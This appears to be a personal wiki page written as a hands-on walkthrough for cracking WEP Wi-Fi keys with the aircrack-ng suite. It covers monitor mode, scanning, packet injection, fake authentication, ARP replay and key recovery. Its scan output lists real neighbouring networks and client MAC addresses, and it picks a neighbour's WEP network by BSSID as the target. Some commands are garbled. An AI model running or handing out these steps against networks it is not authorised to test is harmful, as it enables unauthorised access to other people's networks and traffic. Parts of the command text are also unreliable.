@@ -1,0 +1,161 @@
+* [[Components]] -- Devices I could buy to be more efficient
+* [[Drivers]] -- It might be necessary to update the wifi driver
+
+= Goal =
+This attack aimed at cracking the key
+
+Following the tutorial, wireless exposed and the internet :
+https://www.youtube.com/watch?v=jETwvEDaJeQ
+
+== Configure the interfaces manually (iw) ==
+
+Doing in with my router.
+
+Check the interface with the command:
+    ifconfig -a
+
+Reset all and put down the interface with airmon:
+    sudo ifconfig wlp3s0b1 down
+
+The output of ifconfig will not list wlp3s0b1.
+
+Bring the interface up:
+    sudo ifconfig wlp3s0b1 up
+
+Perform an active scan:
+    sudo iw dev wlp3s0b1 scan
+
+This output of the above command is huge. It scans all the wireless network
+around, for example:
+
+    * [[mynumericable]]
+
+list all the interface:
+    sudo ip link
+
+create a monitor mode interface:
+    sudo iw dev wlp3s0b1 interface add moni0 type monitor
+
+Manually set the channel because my network is running there and I want to fix
+the problem I have not been able to capture data packets:
+    sudo iw dev wlp3s0b1 set channel 11
+
+Other options to listen and inject:
+
+    sudo aiwlp3s0b1rmon-ng check wlp3s0b1
+    sudo airmon-ng stop wlp3s0b1
+
+    To start the network card in monitor mode:
+    sudo airmon-ng start wlp3s0b1
+
+Check that is running in Monitor mode:
+    iwconfig
+
+    sudo airodump-ng wlp3s0b1
+
+== Using aircrack suite ==
+
+Scan the network to find a target:
+    sudo airmon-ng moni0
+
+CH  7 ][ Elapsed: 7 mins ][ 2016-06-09 16:16
+
+ BSSID              PWR  Beacons    #Data, #/s  CH  MB   ENC  CIPHER AUTH ESSID
+
+ A0:21:B7:D5:BA:F6  -38      902        0    0   6  54e  WPA2 CCMP   PSK  NUMERICABLE-34C0
+ 00:19:70:AA:CD:B0  -55     1180        0    0   5  54e. WPA2 CCMP   PSK  CIA6726fb5e9a
+ 00:19:70:91:62:65  -75      273        0    0   1  54e. WPA2 CCMP   PSK  bbox2-0da4
+ 9C:97:26:44:86:DD  -77      343        0    0   1  54e  WPA2 CCMP   PSK  PrincessPaillettée
+ 00:19:70:AF:66:1D  -78      231        0    0   1  54e. WPA2 CCMP   PSK  bbox2-54f4
+ F4:06:8D:71:7F:3A  -80       96        0    0  11  54e  WEP  WEP         NUMERICABLE-CD61
+ 00:19:70:6E:56:DA  -80       89        0    0   1  54e. WEP  WEP         mvm search belgium
+ 0A:19:70:6E:56:DA  -81      129        0    0   1  54e. WPA2 CCMP   MGT  PROXIMUS_AUTO_FON
+ 06:19:70:6E:56:DA  -80      150        0    0   1  54e. OPN              PROXIMUS_FON
+ F4:06:8D:54:51:E8  -80      105        0    0  11  54e. WPA2 CCMP   PSK  devolo-96c
+ 00:0C:F6:A8:BB:C8  -81      116        0    0   6  54e  WPA2 CCMP   PSK  Sitecom_a8bbc8
+
+ BSSID              STATION            PWR   Rate    Lost    Frames  Probe
+
+ (not associated)   EC:1F:72:DB:98:B2  -45    0 - 1      0      166  NUMERICABLE-34C0,Xdius2
+ (not associated)   F0:D1:A9:23:0E:33  -63    0 - 1      0       10
+ (not associated)   84:29:99:00:5C:54  -66    0 - 1      0       24  PrincessPaillettée
+ (not associated)   1C:AB:A7:B2:69:E5  -77    0 - 1      0       11
+ (not associated)   6C:88:14:5C:26:A0  -79    0 - 1      0       18  Securitas Alert
+ (not associated)   00:0C:F6:A8:BB:C9  -81    0 - 1      0        9  WiFi-2.4-EE78
+ (not associated)   A0:88:B4:D6:DF:90  -27    0 - 1      0       67  NUMERICABLE-34C0
+
+Should I wish to crack NUMERICABLE-CD61 or mvm, I would need to write down:
+
+| BSSID             | CH | ESSID              |
+|-------------------|----|--------------------|
+| F4:06:8D:71:7F:3A | 11 | NUMERICABLE-CD61   |
+| 00:19:70:6E:56:DA | 1  | mvm search belgium |>
+
+Note that the CH is the channel and it is the frequency of the wave.  More
+information in https://en.wikipedia.org/wiki/List_of_WLAN_channels
+
+== There is a problem ==
+Despite all my efforts the #Data does not increase, it stays at 0.
+I have changed my cards for an external one and it works.
+
+Following : http://www.aircrack-ng.org/doku.php?id=injection_test&DokuWiki=e2252c309028d2da4fd9b130129c044b
+
+    ➜  Hacking sudo aireplay-ng -9 moni0
+    19:03:34  Trying broadcast probe requests...
+    19:03:34  Injection is working!
+    19:03:36  Found 4 APs
+
+    19:03:36  Trying directed probe requests...
+    19:03:36  00:19:70:AA:CD:B0 - channel: 5 - 'CIA6726fb5e9a'
+    19:03:41  Ping (min/avg/max): 4.113ms/22.613ms/49.862ms Power: -53.20
+    19:03:41   5/30:  16%
+
+    19:03:41  A0:21:B7:D5:BA:F6 - channel: 11 - 'NUMERICABLE-34C0'
+    19:03:46  Ping (min/avg/max): 8.070ms/15.200ms/29.468ms Power: -26.00
+    19:03:46   4/30:  13%
+
+    19:03:46  54:B8:0A:ED:78:FF - channel: 6 - 'dlink_DWR-730_78FF'
+    19:03:51  Ping (min/avg/max): 4.429ms/28.498ms/96.281ms Power: -78.57
+    19:03:51   7/30:  23%
+
+    19:03:51  00:19:70:AF:66:1D - channel: 1 - 'bbox2-54f4'
+    19:03:56  Ping (min/avg/max): 4.186ms/17.858ms/40.960ms Power: -81.67
+    19:03:56   3/30:  10%
+
+It says that the injection is working.
+
+	➜  Hacking sudo aireplay-ng --test -e NUMERICABLE-34C0 -a A0:21:B7:D5:BA:F6 moni0
+	19:07:20  Waiting for beacon frame (BSSID: A0:21:B7:D5:BA:F6) on channel 8
+	19:07:20  moni0 is on channel 8, but the AP uses channel 11
+
+Another test tell me that I have a configuration problem.
+
+
+Take the following action during the same period:
+
+1) The following line will link my wifi to that particular connection:
+
+sudo airodump-ng -w wep -c 11 --bssid F4:06:8D:71:7F:3A wlp3s0b1
+
+2) Let the above command run for sometime and in the meantime run the following:
+
+sudo aireplay-ng -1 0 -a F4:06:8D:71:7F:3A wlp3s0b1
+
+This command will associate my wifi with the connection so that I could
+transmit data.
+
+In another consol, type the following:
+
+3) sudo aireplay-ng -3 -b F4:06:8D:71:7F:3A wlp3s0b1
+
+This command will start sending/receiving data on the new link.
+
+Now you could check action 1 and see that we are sending and receiving data.
+
+We should wait that the amount of data hit 30,000. This will take an hour or so.
+Once this is done, take 3 and interrupt with ctrl-c.
+
+Now we check the directory to find a file .cap the key is inside.
+
+Then type:
+sudo aircrack-ng <file.cap>
